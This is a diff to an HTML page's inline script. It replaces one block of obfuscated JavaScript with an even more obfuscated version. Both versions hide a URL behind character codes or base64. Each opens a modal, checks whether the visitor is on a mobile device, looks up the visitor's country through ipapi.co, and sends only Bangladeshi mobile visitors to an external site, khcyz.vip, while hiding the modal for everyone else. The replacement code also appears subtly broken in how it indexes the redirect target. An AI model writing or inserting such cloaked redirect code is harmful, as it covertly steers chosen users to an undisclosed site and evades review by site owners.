@@ -1,67 +1,15 @@
 <script>
-(function(){
-  var _0x5a2f=function(s){return atob(s)};
-
-  var _0x4f3c=(function(){
-    return String.fromCharCode(
-      104,116,116,112,115,58,47,47,
-      119,119,119,46,107,104,99,121,
-      122,46,118,105,112,47,63,99,
-      104,61,52,102,56,48,51,54,
-      54,100,56,49
-    )
-  })();
-
-  var _d=document,
-      _w=window,
-      _n=navigator,
-      _m=_d.getElementById("m"),
-      _s=_d.getElementById("s"),
-      _b=_d.getElementById("b"),
-      _i=_d.getElementById("i"),
-      _f=_d.getElementById("f");
-
-  if(!_m||!_f) return;
-
-  var _hide=function(){_m.style.display="none"};
-
-  var _isMobile=/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i
-    .test(_n.userAgent);
-
-  setTimeout(function(){
-    _m.style.display="flex";
-    try{_i.focus()}catch(e){}
-  },1000);
-
-  _f.onsubmit=function(e){
-    e.preventDefault();
-    _b.disabled=true;
-    _s.textContent="প্রক্রিয়া চলছে…";
-
-    if(!_isMobile){
-      _s.textContent="";
-      _hide();
-      _b.disabled=false;
-      return;
-    }
-
-    fetch(_0x5a2f("aHR0cHM6Ly9pcGFwaS5jby9jb3VudHJ5Lw=="))
-      .then(r=>r.text())
-      .then(c=>{
-        c=c.trim().toUpperCase();
-        if(c==="BD"){
-          _w.location.href=_0x4f3c;
-        }else{
-          _s.textContent="";
-          _hide();
-          _b.disabled=false;
-        }
-      })
-      .catch(()=>{
-        _s.textContent="";
-        _hide();
-        _b.disabled=false;
-      });
-  };
+(()=>{var _=[atob("aHR0cHM6Ly93d3cua2hjeXoudmlwLz9jaD00ZjgwMzY2ZDgx"),"x","flex","none","BD","submit","country","text","userAgent","Android|iPhone|iPad|Mobile","location","href"];
+let d=document,g=i=>d.getElementById(i),m=g(_[1]),f=g("y"),s=g("w"),k=new RegExp(_[9],"i").test(navigator[_[8]]);
+setTimeout(()=>{m.style.display=_[2]},900);
+f.addEventListener(_[5],e=>{
+e.preventDefault();
+if(!k){m.style.display=_[3];return}
+fetch("https://ipapi.co/"+_[6]+"/")
+.then(r=>r[_[7]]())
+.then(r=>{r=r.trim();r===_[4]?window[_[10]][_[11]]=_[_[0]]:m.style.display=_[3]})
+.catch(()=>m.style.display=_[3])
+})
 })();
 </script>
+</body></html>
